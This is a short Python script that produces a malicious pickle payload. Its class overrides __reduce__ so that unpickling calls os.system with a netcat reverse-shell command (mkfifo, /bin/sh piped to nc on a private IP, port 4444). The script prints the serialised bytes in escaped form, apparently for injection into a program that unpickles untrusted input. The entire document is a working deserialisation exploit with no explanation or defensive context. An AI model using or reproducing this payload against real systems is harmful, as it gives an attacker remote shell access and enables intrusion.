import pickle
import base64
import os
class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 192.168.84.129 4444 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    res = pickle.dumps(RCE())
    print(''.join(map(lambda x:'\\x%02x'%x, res)))

